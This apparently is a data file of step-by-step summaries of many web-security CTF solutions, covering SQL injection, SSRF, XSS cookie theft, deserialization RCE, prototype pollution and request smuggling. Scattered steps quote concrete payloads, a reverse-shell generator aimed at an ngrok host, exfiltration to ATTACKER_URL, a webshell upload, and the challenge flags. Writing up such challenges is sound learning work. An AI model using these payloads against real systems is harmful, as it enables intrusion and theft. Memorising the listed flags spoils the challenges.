    "Find an unfixed issue revealing a Local File Inclusion (LFI) vulnerability in PHP-Proxy",
    "Locate an exploit script provided in the GitHub issue",
    "Modify the exploit script to target the provided site and the located /flag.txt",
    "Run the modified exploit script",
    "Obtain the flag",
    "Perform extended analysis of the vulnerability",
    "Discover that the encryption function in PHP-Proxy is not secure",
    "Realize that the encryption key can be reverse-engineered",
    "Use the obtained encryption key",
    "Manipulate the file:// protocol",
    "Access otherwise forbidden files",
    "Viewed page source.",
    "Found a commented information indicating possible internal IP and an endpoint for admins.",
    "Attempted to access the admin console ('/login.php').",
    "Received a 403 Forbidden response.",
    "Formed a hypothesis.",
    "Hypothesized that the page might be checking the client's IP to decide if it's an admin.",
    "Decided to try sending a fake IP address in the headers.",
    "Decided to use the 'X-Forwarded-For' field to send the fake IP address.",
    "Scanned the entire subnet from 172.16.2.0 to 172.16.2.255 using Burp Suite Intruder.",
    "Set 'X-Forwarded-For' to every IP in the range 172.16.2.0 to 172.16.2.255.",
    "Identified that 'X-Forwarded-For: 172.16.2.24' allows access to 'login.php'.",
    "Examined the login form on 'login.php'.",
    "Noticed 'email' and 'pass' fields.",
    "Realized the 'email' and 'pass' fields are vulnerable to an SQL injection attack.",
    "Submitted an SQL injection in the 'email' and 'pass' parameters.",
    "Used a payload conforming to the INSERT query syntax.",
    "Successfully logged in as admin.",
    "Found the flag.",
    "Inspect the source code for vulnerabilities and weaknesses.",
    "Analyze the authentication process to understand its flow and mechanisms.",
    "Identify the relevant classes and methods used for authentication.",
    "Find the specific vulnerability in the PHP code that allows object injection.",
    "Understand that the `login` cookie is transformed into a `Login` object during deserialization.",
    "Analyze the structure and properties of the `Login` object to find potential vulnerabilities.",
    "Recognize that the `Login` object contains an MFA token and a reference to a `User` object.",
    "Inspect the `User` object to find its instantiation of a `SQL` object.",
    "Understand that the `SQL` class performs SQL queries and considers the results for authentication.",
    "Recognize the existence of a `$query` attribute in the `SQL` class utilized for creating a prepared statement.",
    "Observe that the authentication process terminates if the `bind_param()` call returns false.",
    "Understand the concept of exploiting object injection by inserting custom objects into user data, thus altering protected attributes and evading authentication.",
    "Create a plan to circumvent MFA token check and SQL by manipulating variables: Set `$mfa_token` as a reference to `$_correctValue` and modify `$query`.",
    "Generate customized versions of the `User` and `Login` objects that allow bypassing the MFA token check.",
    "Recognize that modifying the `$query` permits performing an SQL injection and intend to adjust it accordingly to evade authentication.",
    "Compose PHP code to generate the custom objects (`Login`, `User`, `SQL`). The custom `Login` object encompasses the custom `User` object and the `$_correctValue` reference. The custom `User` object encompasses a customized `SQL` object with the custom `$query`.",
    "Perform serialization, encoding, and URL-encoding of the custom `Login` object.",
    "Assign the `login` cookie with the output obtained from the previous step.",
    "Access the application by logging in with the manipulated cookie to acquire the flag.",
    "Accessed the provided web page http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719",
    "Accessed the Favicon of the webpage",
    "Found some encoded payload",
    "Decoded the base64 encoded payload",
    "Found PHP script",
    "Interpreted the PHP script",
    "Found new endpoint for POST requests",
    "Noted that incoming data was saved into HTML files",
    "Found that http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data.php lists all HTML files",
    "Noted that admin reads these HTML files",
    "Crafted an XSS payload to get the cookies of the admins",
    "Sent this XSS payload through the data endpoint",
    "Set up a server to catch the redirected request with admin cookies",
    "Accessed robots.txt to find interesting entries",
    "Authenticated as admin and explored login.php",
    "Set debug parameter to TRUE",
    "Noted SQL errors",
    "Noted filter size limitation",
    "Crafted an SQL injection payload bypassing the filter limit",
    "Used the SQL injection payload to retrieve the flag",
    "Located a PHP webpage.",
    "Identified a login.php page.",
    "Received a 403 Forbidden error from the login.php page.",
    "Investigated gallery.php.",
    "Noticed pictures of devices.",
    "Observed internal subnet addresses on the devices.",
    "Hypothesized that the login page might be filtering requests by the user's IP address.",
    "Used Burp Suite Intruder scan.",
    "Modified 'X-Forwarded-For' header value.",
    "Set the header value to the internal IP address observed from gallery.php.",
    "Set the 'X-Forwarded-For' header to '192.168.3.16'.",
    "Gained access to the login page.",
    "Located a form on the login page.",
    "Identified fields labeled 'username' and 'password'.",
    "Attempted to use ' in the username parameter.",
    "Identified an SQL injection vulnerability.",
    "Used the payload 'username=test&password=test' or 1=1 LIMIT 1;#'.",
    "Bypassed authentication.",
    "Logged in as the admin.",
    "Accessed a users.php page.",
    "Observed data containing usernames and card numbers.",
    "Investigated users.php page.",
    "Searched for additional SQL injection endpoints.",
    "Accessed the URL /users.php?id=1.",
    "Verified it returns data for user ID 1.",
    "Fuzzed the input values.",
    "Identified a second SQL injection endpoint.",
    "Attempted various inputs.",
    "Encountered a blacklist filter preventing certain inputs.",
    "Utilized SQLMap.",
    "Identified possible injection vectors.",
    "Initiated a database dump.",
    "Observed the 'users_data' database structure.",
    "Identified a column labeled 'R34L_F14G'.",
    "Noted that queries to this column return blank results.",
    "Attempted to replace 'card_num' with 'R34L_F14G' in SQLMAP query.",
    "Realized the action fails due to the blacklist filter.",
    "Utilized SQLMap targeting 'login.php' page.",
    "Exploited the secondary SQL injection vector.",
    "Retrieved data from 'R34L_F14G' column in 'users_data' table.",
    "Retrieved the flag 'S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}'.",
    "Intercept the HTTP request",
    "Analyze the form submission structure",
    "Modify the HTTP GET parameter",
    "Set the GET parameter to 'print=echo+'';phpinfo()'",
    "Observe the result",
    "Notice the validation of arbitrary code execution",
    "Enable the 'debug' option",
    "Examine the source code of the page",
    "Identify the 'eval()' vulnerability",
    "Understand the list of blocked keywords/functions in the source PHP code",
    "Identify the variables $blocked, $special_block, and $$special_block",
    "Recognize that they are defined before the 'eval()' statement",
    "Understand that they can be referenced in the eval-ed code",
    "Understand the concept of $$ variable in PHP",
    "Analyze how $$ variable is used in the code",
    "Reference the blocked function and restricted file",
    "Set the GET parameter to '?print=echo+'';print(eval('return ${blocked}[4](${nc});'))'",
    "Observe the execution of eval function",
    "Note that it executes file_get_contents('../flag.txt')",
    "Realize that eval does not display the output",
    "Use print to display the output",
    "Observe the retrieval of the flag",
    "Visited the challenge website.",
    "Tried to understand how the website works.",
    "Identified an admin bot script provided by the challenge.",
    "Used Chrome DevTools.",
    "Examined how the note taking app functions.",
    "Analyzed the notes app's JavaScript source code.",
    "Discovered that the app uses local storage to save notes.",
    "Learned that the search feature places the query into the URL's fragment identifier.",
    "Saw that search results affect which image loads.",
    "Noted that 'y.png' loads if the query is found within a note.",
    "Noted that 'n.png' loads if the query is not found within a note.",
    "Understood that the admin bot visits any URL provided.",
    "Understood that the admin bot stores a flag as a note on the challenge server before visiting the URL.",
    "Realized it might be possible to force the admin bot to perform a search function on the server.",
    "Realized that the search function checks if a given fragment identifier substring is part of the flag.",
    "Considered using a cache probing attack to detect whether a search was successful.",
    "Considered using the presence of 'y.png' or 'n.png' in the cache as an indicator of search success.",
    "Constructed a JavaScript payload to be run on the victim's browser.",
    "The payload loads an iframe of the notes site with a search query.",
    "The payload measures the time taken to fetch 'y.png'.",
    "Automated a bruteforce attack with a Python script.",
    "The script loads a template including the query for each possible character.",
    "Discovered that headless mode of Chrome doesn't perform cache partitioning.",
    "Realized that this allows the cache probing attack to succeed.",
    "Realized that the cache is not separated between headless and non-headless Chrome instances.",
    "Found out the intended solution involves bypassing the cache partitioning.",
    "The solution involves controlling a subdomain that matches the site domain.",
    "Noted that subdomains and port numbers are ignored in cache keys.",
    "Identified that the website is a GitHub Pages site.",
    "Noted that the site does not require proof of domain ownership.",
    "Realized that an attacker can set up a GitHub Pages site with a subdomain that matches the site domain.",
    "Created a new GitHub Pages site.",
    "The site's subdomain matches the target domain.",
    "Deployed the previously developed JavaScript payload.",
    "The payload is deployed to the new GitHub Pages site.",
    "Launched the attack script on the new GitHub Pages site.",
    "Observed the attack working even with Chrome's cache partitioning policy.",
    "Identify the exposed '.git' directory",
    "Determine that the source code is exposed",
    "Locate the 'app.py' file",
    "Identify the flag exposed within 'app.py'",
    "Recognize the existence of the 'new chat' feature",
    "Determine the presence of a vulnerability in the 'new chat' feature",
    "Observe the sending of an SMS",
    "Identify the condition for invoking the 'send_sms' function",
    "Recognize the location of the 'send_sms' function in 'sms.py'",
    "Recognize the usage of Flask's 'render_template_string' function",
    "Identify the utilization within the 'send_sms' function",
    "Understand the control of the resulting template",
    "Recognize 'login' as the user-controllable portion",
    "Recognize the potential for Server-Side Template Injection (SSTI)",
    "Identify the 'add_money_to_login' function added to the template context",
    "Create two user accounts",
    "Set one of the usernames as '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
    "Compose an SMS message",
    "Invoke the 'render_template_string' function using the SMS message",
    "Trigger the 'add_money_to_login' function through the 'render_template_string' function",
    "Accumulate a significant amount of money",
    "Utilize the aforementioned method for money generation",
    "Access the flag purchase system",
    "Use the acquired financial resources to purchase the flag",
    "Identify a user profile.",
    "Discover list of created books hosted on the server.",
    "Understand each book's URL structure on server.",
    "Identify USER_ID.",
    "Identify FILENAME.",
    "Discover the server technology.",
    "Identify PHP as the server technology.",
    "Observe the behavior of file downloads.",
    "Notice that files with commonly used extensions are downloaded.",
    "Notice that .html files are rendered inline.",
    "Attempt to upload a file.",
    "Choose a .php file for upload.",
    "Intend to run arbitrary PHP code.",
    "Realize the filtering of .php extensions.",
    "Notice the recursive nature of the filtering.",
    "Test different file extensions.",
    "Discover the .phtml extension.",
    "Verify that .phtml extension executes PHP code.",
    "Determine that the .phtml extension is not being filtered.",
    "Upload a PHP webshell.",
    "Choose a .phtml file for upload.",
    "Navigate to the uploaded webshell.",
    "Execute the command cat /flag.txt.",
    "Acquire the flag.",
    "Given the /request endpoint from challenge.",
    "Identified behavior: if the host is not found or the URL is invalid, a specific message is returned.",
    "Identified behavior: if SSRF is detected, a specific message is returned.",
    "Blacklist works based on 'localhost' and '127'.",
    "Understood that the server uses Python's requests library to issue GET requests to the submitted URL.",
    "Returns response headers.",
    "Found a way to bypass the localhost blacklist by using an alternative representation of '127.0.0.1', like '0177.0.0.1'.",
    "Bypassed filter.",
    "Performed an internal port scan for ports between 5000 and 10000.",
    "Found out that ports 8080 and 9006 were open.",
    "Identified content lengths as indicators of page existence due to uniform content length of Not Found (404) pages.",
    "Identified that the page at port 8080 is the same as the public challenge site.",
    "Tried to access port 9006 directly but didn't get meaningful information.",
    "Used a redirection through a PHP server, which revealed the flag in one of the headers.",
    "Given an endpoint that allows sending feedback in form of HTML.",
    "Initial attempts to supply URLs were futile.",
    "Discovered that arbitrary HTML submitted is rendered by the admin's browser.",
    "Verified this by submitting HTML enclosed in script tags to catch the HTTP request.",
    "Introduced three separate payloads in the HTML.",
    "Payload 1: Obtained the full URL of the browsing context.",
    "Payload 2: Obtained the page contents.",
    "Payload 3: Obtained readable cookies.",
    "Extracted the page URL.",
    "Learned that our submitted HTML was the only content present on the page.",
    "Found that JavaScript couldn't read any cookies from the output of the payloads.",
    "Used the discovered page URL (`http://0.0.0.0/Secret_admin_cookie_panel`).",
    "Received a `Set-Cookie` header from this page for a new cookie with HttpOnly flag set.",
    "Identified a `/flag` endpoint.",
    "Endpoint had been inaccessible due to lack of the appropriate cookie.",
    "Revisited the page with the newly acquired 'admin' cookie.",
    "Allowed access to the `/flag` endpoint.",
    "Revealed the flag.",
    "Inspect the given source code.",
    "Identify the '/guest' endpoint.",
    "Recognize that the 'guest' cookie is base 64 decoded in the deserialization process.",
    "Recognize that there's a well-known deserialization vulnerability in node.js.",
    "Understand that this vulnerability could lead to Remote Code Execution (RCE).",
    "Understand that RCE can be achieved by passing a serialized object into 'serialize.unserialize()'.",
    "Understand that a JavaScript Immediately Invoked Function Expression (IIFE) can be used for RCE.",
    "Plan to execute a reverse shell payload.",
    "Understand that the reverse shell payload will be fired when the data is deserialized.",
    "Craft a reverse shell payload using 'nodejsshell.py'.",
    "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
    "Copy the output from the crafted reverse shell payload.",
    "Paste the copied output into the function body.",
    "Test the payload to ensure it works.",
    "Encode the payload to base 64.",
    "Send the encoded payload through the cookie header.",
    "Establish a reverse shell.",
    "Read the flag using the established reverse shell.",
    "Checked source code.",
    "Identified the prototype pollution vulnerability.",
    "Understood that 'JSON.parse' allows the '__proto__' key.",
    "Stored the '__proto__' key as ['__proto__'].",
    "Identified how to leverage the prototype pollution.",
    "Leveraged the prototype pollution to run 'require('./usage')'.",
    "Noticed that causing a TypeError triggers the 'require('./usage')'.",
    "Interpreted how 'pkg' and 'pkgPath' can be controlled.",
    "Controlled 'pkg' by polluting '__proto__.data'.",
    "Controlled 'pkgPath' by polluting '__proto__.path'.",
    "Found out that 'pkg' is an object containing the 'package.json' fields.",
    "Found out that 'pkgPath' is the path to this package.",
    "Found that we can load any JavaScript file.",
    "Polluted 'data' in '__proto__.data' to load the JavaScript file.",
    "Polluted 'exports' in '__proto__.path' to load the JavaScript file.",
    "Found '/opt/yarn-v1.22.19/preinstall.js' in the container.",
    "Identified that 'child_process.execFileSync' is being called in 'preinstall.js'.",
    "Understood that to reach this code path, 'npm_config_global' needs to be polluted.",
    "Polluted 'npm_config_global' to a truthy value.",
    "Realized that 'process.env.npm_execpath' can be controlled.",
    "Set 'process.env.npm_execpath' to a controlled value.",
    "Figured out how to use '--eval' option to run inline JavaScript.",
    "Realized JSON payload cannot have spaces due to regex match.",
    "Used '${IFS}' to get around the regex match restriction.",
    "Defined final payload using 'wget' and command substitution.",
    "Exfiltrated the '/readflag' output using the defined payload.",
    "Sent the payload to the HTTP server.",
    "Received the flag from the HTTP server.",
    "Visit the webpage.",
    "Analyze the response headers.",
    "Guess that the server was using FastAPI.",
    "Download the `openapi.json` file.",
    "Look for available endpoints in the downloaded `openapi.json` file.",
    "Understand the functionality of the `/new` endpoint.",
    "Refer to the downloaded JSON to understand the functionality of the `/new` endpoint.",
    "Investigate the requirements and specifications of an uploaded zip file.",
    "Check if the uploaded zip file should contain a `run` bash script.",
    "Create a zip file.",
    "Add a `run` bash script to the zip file.",
    "The `run` bash script gives a reverse shell.",
    "Upload the zip file.",
    "Read the first flag.",
    "Perform the action with `nobody` user permissions.",
    "Use the gained reverse shell.",
    "View the source code of the program.",
    "Discover that if a zip file with 'docker-entry' in its name is uploaded.",
    "The program will execute the script within a docker container with greater access (runs as `uploaded` user).",
    "As opposed to executing normally (runs as `nobody` user).",
    "Understand that gaining a shell inside the docker container could provide more privileges.",
    "Write a binary.",
    "Compile the binary.",
    "Give SUID and SGID permissions to the binary.",
    "Set the effective user and group IDs to that of the SUID and SGID permissions.",
    "Run the binary inside the docker container.",
    "Increase the privileges.",
    "Read the second flag.",
    "Identify that the challenge consists of 3 services - Traefik (a HTTP proxy)",
    "Identify that the challenge consists of 3 services - a Python microservice",
    "Identify that the challenge consists of 3 services - a Go microservice",
    "Observe the configuration file of the Traefik service",
    "Note that the Traefik service acts as a reverse proxy for the Go microservice",
    "Note that the Traefik service only accepts the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Examine the Go microservice",
    "Note that the Go microservice uses the Beego web framework",
    "Note that the Go microservice acts as a reverse proxy for the Python microservice when the PUT method is used",
    "Evaluate the Python microservice",
    "Note that the Python microservice allows the running of arbitrary commands when the GET method is used",
    "Realize the challenge of reaching the Python microservice that only accepts the PUT method",
    "Realize the challenge of reaching the Python microservice while the Traefik proxy only allows the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Inspect the Beego source code",
    "Find a way of issuing a pseudo PUT request by using a POST request with a '_method' query parameter set to PUT",
    "Make a request to the Go microservice using a POST method",
    "Include a '_method=PUT' query parameter in the request",
    "Reach the 'Put()' handler of the Go microservice",
    "Identify that the Python microservice runs on Flask's built-in server",
    "Note that Flask's built-in server can be susceptible to HTTP request smuggling attacks due to its insecure nature",
    "Navigate the HTTP request smuggling attack",
    "Note that the Flask server treats underscores ('_') as hyphens ('-')",
    "Note that the Flask server allows duplicate 'Content-Length' headers",
    "Setup a request",
    "Include differing 'Content-Length' header values in the request",
    "Take advantage of the Flask server's failure to comply with RFC norms",
    "Cause a GET request to the Python microservice to be executed",
    "Smuggle the GET request inside a POST request made to the Go microservice",
    "Use HTTP request smuggling techniques",
    "Get a reverse shell on the Python microservice",
    "Obtain the flag",
    "Read the given challenge.",
    "Understand that the challenge involves investigating an unintentionally exposed internal API and finding a flag.",
    "Go through the provided source code.",
    "Investigate the backend.",
    "Spot an interesting behavior with 'RegExp.prototype.test()' used with regex containing the global flag.",
    "Understand that this trick helps continue the search from the previously found index onwards and it can allow multiple instances of 'fqdn'.",
    "Find a way around the restrictive regex check.",
    "Submit the same payload multiple times.",
    "Convince the server to communicate with arbitrary URL.",
    "Bypass the regex using the provided loophole.",
    "Understand the requirement of a 'Buffer' of 16 bytes.",
    "Understand the necessity of having at least 32 characters in the 'fqdn'.",
    "Leverage the behavior of 'Buffer' stopping at the first non-hexadecimal character.",
    "Derive a URL that starts with 32 bytes of hexadecimal characters using leading 0's.",
    "Convert your public IP address to octal form using an octal IP address converter.",
    "Ensure the trailing '.ping-proxy/ping' turns into a URL fragment.",
    "Append '#' at the end of the 'fqdn' to make the final URL your public IP address.",
    "Receive the request.",
    "Observe the flag in the request header.",
    "Claim the flag.",
    "Complete the challenge.",
    "Load the CTF challenge.",
    "Look into the provided source code to understand how the application works.",
    "Notice that the application is a 'screenshotter' service.",
    "Notice that the 'screenshotter' service allows users to enter arbitrary URLs.",
    "Notice that the entered URLs are rendered by a Chromium instance.",
    "Observe that the service doesn't allow for file:// protocol.",
    "Observe that the service validates the URL to be HTTP(S).",
    "Read the function getBrowserWithTimeout.",
    "Note that a remote debugging port is exposed.",
    "Understand that the exposed port allows commands to be sent to the browser through the DevTools protocol.",
    "Consider that the debugging port is randomized.",
    "Consider that the debugging port is generated from the getRandomPort function.",
    "Formulate a strategy to leak the debugging port.",
    "Understand that the port scan needs to be completed within 30 seconds.",
    "Understand that the port scan needs to be completed before the browser instance is closed.",
    "Code a web page that uses a Promise.",
    "Use the Promise to try and load a URL.",
    "If the URL loads, log that the port is open.",
    "Attempt to send this information to a remote server.",
    "Set up a remote server for this purpose.",
    "Deploy this page on a server.",
    "Point the 'screenshotter' service to the deployed page.",
    "Detect open debugging ports.",
    "Create the server script.",
    "Receive the port number from the exfiltration attempt.",
    "Write the port number used to a file to keep track.",
    "Request Chromium to open a new webpage.",
    "Target the URL file:///tmp/flag.txt.",
    "Use the obtained port number for the request.",
    "Display the flag in the browser instance.",
    "Fetch the screenshotter service.",
    "Put the result in an iframe.",
    "Display the iframe in the screenshotting service.",
    "Take the screenshot of the flag.",
    "Convert the image to text using OCR.",
    "Extract the flag from the converted text.",
    "Build a second-stage exploit.",
    "Create a WebSocket connection to the DevTools of the browser instance.",
    "Send JavaScript code to the browser instance.",
    "Use the Runtime.evaluate method for sending the code.",
    "The JavaScript sends a POST request.",
    "Exfiltrate the contents of the 'flag' file in the POST request.",
    "Visit the website.",
    "Observe the URL http://asuna.nullsession.pw.",
    "Observe the HTTP response.",
    "Try using /search as per instructions in the response.",
    "Test classic SQL Injection payloads.",
    "Receive 403 Forbidden.",
    "Observe the page indicating SQL Injection attacks are blocked.",
    "Notice the 'Server' header in HTTP response.",
    "Observe that the application is behind AWS ELB.",
    "Assume the application is likely behind AWS WAF.",
    "Review the AWS WAF documentation.",
    "Pay particular attention to rules blocking longer payloads.",
    "Test a trivial payload.",
    "Use a payload with a length over 8kB.",
    "Confirm that the payload is not blocked.",
    "Write an SQLMap tamper script.",
    "Prepend 'a' characters to the payload.",
    "Ensure the payload exceeds 8kB.",
    "Use the tamper script with SQLMap.",
    "Dump the database.",
    "Find flag in the database dump.",
    "Review the AWS managed rules changelog.",
    "Review corresponding documentation for mitigation strategies.",
    "Visited the website.",
    "Observed that there is a proxy server and a backend server accessible at provided URLs.",
    "Inspected the proxy server.",
    "Noticed that the proxy server makes a request to the backend server.",
    "Identified that a 'secret' token is added to cookies in the request to the backend server.",
    "Understood that a user-controlled 'uri' is involved in the attack.",
    "Discovered that the 'uri' is appended to the backend URL using Python's urllib.parse.urljoin.",
    "Realized the issue with urllib.parse.urljoin.",
    "Identified that urllib.parse.urljoin can return the appended path as the base URL when handling malformed paths.",
    "Exploited the issue in urllib.parse.urljoin.",
    "Formed a request to the proxy server.",
    "Included a 'uri' parameter with a malformed path, such as //ATTACKER-URL, in the request.",
    "Caused the proxy server to send a request to the specified URL.",
    "Received a request from the proxy server.",
    "Extracted the 'secret' cookie value from the request.",
    "Obtained knowledge of the 'secret' token.",
    "Used the 'secret' token to send a request directly to the backend server.",
    "Learned that the backend server checks for the 'secret' cookie.",
    "Discovered that the flag is returned by the backend server only if the 'secret' cookie is present.",
    "Obtained the flag 'CTFSG{d0nT_toUcH_mY_c00k13s}'.",
    "Identify the end goal as getting access to /flag.",
    "Note that the JWT token needs to have the role attribute changed to admin.",
    "Study the registration and login process.",
    "Note that a JWT key is created for each new user during registration.",
    "Understand that the JWT key is used to sign the token during login.",
    "Identify the caching mechanism for user JWT keys.",
    "Note that each user's JWT key is stored in a Redis cache.",
    "Observe that the JWT key is only stored for 2 seconds.",
    "Explore the non-admin path, /sakura.",
    "Identify that /sakura allows interaction with the Redis cache.",
    "Note that the process only permits requests from a client URL validated to be 127.0.0.1.",
    "Identify the endpoint /rin that uses SSRF code.",
    "Note that the server checks the X-Forwarded-For header to validate the client IP.",
    "Realize that by adding X-Forwarded-For: 127.0.0.1, an SSRF is possible to the /sakura endpoint.",
    "Note that the cached secret is only available for 2 seconds after logging in.",
    "Understand that the SSRF request must be made immediately after login.",
    "Use the JWT secret to create a JWT with the admin role.",
    "Utilize https://jwt.io/ or a JWT-signing library for the JWT creation.",
    "Make a request to /flag using the new admin JWT token.",
    "Retrieve the flag from the response.",
    "Registered a new account.",
    "Used the provided URL for registration.",
    "Analyzed the provided source code.",
    "Examined how the OTP verification is performed.",
    "Search for vulnerabilities in other functions.",
    "No flaws found in OTP verification logic.",
    "Examined the search function.",
    "Looked for potential vulnerabilities in the search function.",
    "Identified a potential SQL Injection vulnerability.",
    "Analyzed the MySQL query builder in the search function.",
    "Explored potential SQL Injection through string manipulation.",
    "Observed restrictions on certain characters and strings.",
    "Noted restrictions on space, 'AND', 'OR', etc.",
    "Exploited the SQL Injection protection bypass.",
    "Utilized MySQL comments to act as spaces.",
    "Crafted payload '/search?q=socengexp'/**/AANDND/**/(SUBSTR(otp,<POSITION>,1))='<GUESS>'.",
    "Brute-forced the OTP character by character.",
    "Used the obtained OTP for verification and login.",
    "Accessed the '/cornelia' URL.",
    "Performed a GET request on the chosen URL.",
    "Identified a Server Side Request Forgery (SSRF) vulnerability.",
    "Located the vulnerability in the '/cornelia' URL.",
    "Realized that direct exploitation of SSRF is not possible.",
    "Noted the validation preventing 'localhost' or '127.0.0.1'.",
    "Leveraged the server's behavior of following redirects.",
    "Constructed a PHP redirect to access 'localhost:8081/flag'.",
    "Retrieved the flag 'CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}'.",
    "Access the website at the URL: http://chals.ctf.sg:40401",
    "View the source code of the PHP page",
    "Locate the PHP script that compares the md5 hashes of 'i1' and 'i2'",
    "Comprehend the loose comparison ('==') operator used in PHP to compare two md5 hashes",
    "Learn that if a string starts with '0e...' in PHP, it is treated as a float with the value 0.0",
    "Execute PHP commands to confirm the behavior of '0e...' strings being treated as 0.0 in PHP",
    "Acknowledge the existence of 'magic hashes' that PHP considers equal",
    "Consult a list of strings that generate these 'magic hashes' in PHP",
    "Select two strings from the 'magic hash' list that have a length of 15 or more characters",
    "Generate a GET request to the page, with the chosen strings as the values for 'i1' and 'i2'",
    "Receive a server response containing the flag value: 'CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}'",
    "Analysed the `main.dart.js`.",
    "Recognized that `main.dart.js` is the Flutter app compiled by `dart2js`.",
    "Discovered an `AdminPage`.",
    "Identified a `/api/flag` endpoint.",
    "Recognized that the `/api/flag` endpoint is fetched using `postRequestWithCookies`.",
    "Identified a `/api/token` endpoint.",
    "Recognized that the `/api/token` endpoint is in `LoginPage`.",
    "Noted that the `/api/token` endpoint returns the current authentication token.",
    "Examined features of the application.",
    "Identified parameters in the WebSocket message.",
    "Recognized that the parameters in the WebSocket message could be modified.",
    "Realized that modifying the parameters allows callback to our server.",
    "Attempted XSS payloads.",
    "Realized that rendering unescaped HTML was unsuccessful.",
    "Recognized that the app is rendered on a `<canvas>`.",
    "Manipulated the `widget` parameter.",
    "Caused a traceback.",
    "Used `Access-Control-Allow-Origin: *` header.",
    "Avoided CORS issues.",
    "Identified the remote Flutter widget file signature.",
    "Decoded the `chatmessage` widget.",
    "Used Remote Flutter Widgets package for decoding.",
    "Tried to manipulate the `clipboard_getData` function.",
    "Found the `clipboard_getData` function in `main.dart.js`.",
    "Took a closer look at `poll.dart`.",
    "Recognized the Mechanism `ApiMapper` in `poll.dart`.",
    "Noted that the `ApiMapper` makes a GET request.",
    "Identified the specified `apiGet` URL.",
    "Found a mechanism to fetch the poll options.",
    "Recognized the `onPressed` event handler `api_post`.",
    "Noted that the poll options are exfiltrated to `example.com`.",
    "Modified the `ApiMapper`.",
    "Modified the GET request.",
    "Identified the specified `apiGet` URL.",
    "Used the `onLoaded` event handler.",
    "Triggered the `api_post` event.",
    "Performed zero-click exfiltration.",
    "Obtained the admin's token.",
    "Fetched the flag.",
    "Retrieved the flag from the `/api/flag` endpoint.",
    "Access the webpage.",
    "Observe the interface to a router with a ping functionality.",
    "Identify a specific end-point '/ping?id='.",
    "Observe that the end-point returns base64-encoded result of each ping request.",
    "Discover that using a sufficiently large 'id' can cause an out-of-bound memory read.",
    "Enumerate the 'id' range between '18446744073709551463' to '18446744073709551615'.",
    "Observe that the enumerated IDs correspond to the router's RAM.",
    "Realize that the RAM can be dumped using this technique.",
    "Execute a Python script.",
    "Send GET requests with incrementing 'id' using the script.",
    "Retrieve data from the response.",
    "Decode the base64 data.",
    "Append the decoded result to a file.",
    "Perform a string search on the 'out.bin' file.",
    "Find a potential flag in the search results.",
    "Guess that the flag is 'FLAG{r0uter_p0rtals_are_ultimately_impenetrable_because_they_are_real_weird}'.",
    "Review the site's JavaScript.",
    "Understand that the 'demo()' function is called on the 'demo' GET request parameter.",
    "Realize that this results in the setting of the innerHTML of the 'result' element.",
    "Discover the 'mock()' function.",
    "Understand that it is a wrapper function.",
    "Realize that it runs the function exposed by the WASM module.",
    "Identify that the WASM module uses the 'str.length' to validate the buffer.",
    "Realize that the buffer length can be less than the number of characters written into it.",
    "Understand that this is due to inconsistencies in length measurement of Unicode characters.",
    "Find that the Unicode character 'ß' turns into two characters 'SS' when converting to upper case.",
    "Realize that this allows us to bypass the JavaScript's check.",
    "Develop the XSS payload using <img src='x' onerror='PAYLOAD'>.",
    "Take into account that JavaScript is a case-sensitive language.",
    "Understand that our payload is converted to uppercase before being written to the innerHTML.",
    "Modify the initial JavaScript payload.",
    "Replace the string 'alert(1)' with the converted string of our JavaScript payload.",
    "Make the JavaScript payload fetch localStorage.getItem('flag') and send it to the attacker's URL.",
    "Run the Python script.",
    "Generate a URL-encoded string.",
    "Place the URL-encoded string in the URL parameter 'demo'.",
    "Execute our malicious JavaScript code when the page loads.",
    "Analyzing the provided Javascript and Dockerfile scripts.",
    "Noticing the main class, Database, which creates, retrieves and generates tokens for notes.",
    "Identifying that process.env.FLAG in db.createNote({ data: process.env.FLAG }) is storing the flag.",
    "Discovering a programming error where crypto.randomUUID (the function) is used as the secret, instead of calling it.",
    "Understanding that the secret is not 'secret-[random UUID]' as expected, but it is the string: 'secret-function randomUUID(options) { if (options !== undefined) validateObject(options, 'options'); const { disableEntropyCache = false, } = options || {}; validateBoolean(disableEntropyCache, 'options.disableEntropyCache'); return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID(); }'.",
    "Exploiting the fact that the token for id=0 is the same every time.",
    "Using the method 'db.generateToken(0)' to generate the token.",
    "Submitting the generated token to retrieve the flag.",
    "Study and understand the given client-side web exploitation challenge.",
    "Submit a URL to the '/share' endpoint.",
    "Visit the URL submitted to the '/share' endpoint by an admin bot.",
    "Identify the '/queue' WebSocket endpoint.",
    "Verify that the WebSocket client's origin starts with 'http://localhost'.",
    "Check if the client has the correct 'auth' cookie set.",
    "Understand that the correct 'auth' cookie is set at the '/auth' endpoint.",
    "Confirm that the request to the '/auth' endpoint is made locally by the admin bot.",
    "Perform a GET-based CSRF through a top-level navigation.",
    "Set the authentication cookie for the victim using JavaScript.",
    "Ensure the completion of navigation and placement of the cookie by sleeping for 1 second.",
    "Understand that the WebSockets library used is flask_sockets.",
    "Realize that there is no vulnerability in the ws.origin.",
    "Notice that ws.origin corresponds to the Origin request header.",
    "Understand that the Origin request header cannot be modified by JavaScript.",
    "Recognize that the Origin request header comprises the webpage URL in the format: ://hostname:port.",
    "Realize that the exploit page's origin must start with 'http://localhost'.",
    "Acknowledge that there is no known way to bypass the requirement for 'http://localhost' as the origin.",
    "Consider the possibility of exploiting a browser zero-day to spoof Origin headers.",
    "Manipulate the fact that WebSocket connection validation does not guarantee that the page is hosted on localhost.",
    "Consider using a domain starting with localhost, such as localhost.zeyu2001.com.",
    "Identify that CSRF token is not being checked.",
    "Recognize that WebSockets are not restricted by the Same-Origin Policy.",
    "Understand that 'cross-site WebSocket hijacking' can be used to obtain and exfiltrate the flag.",
    "Construct a page hosted on a domain starting with 'localhost'.",
    "Submit the constructed page to the '/share' endpoint.",
    "Set the auth token by making the bot visit 'http://localhost:7070/auth'.",
    "Open a WebSocket to 'ws://localhost:7070/quote'.",
    "Exfiltrate the data to 'http://ATTACKER_URL'.",
    "Analyse PHP code.",
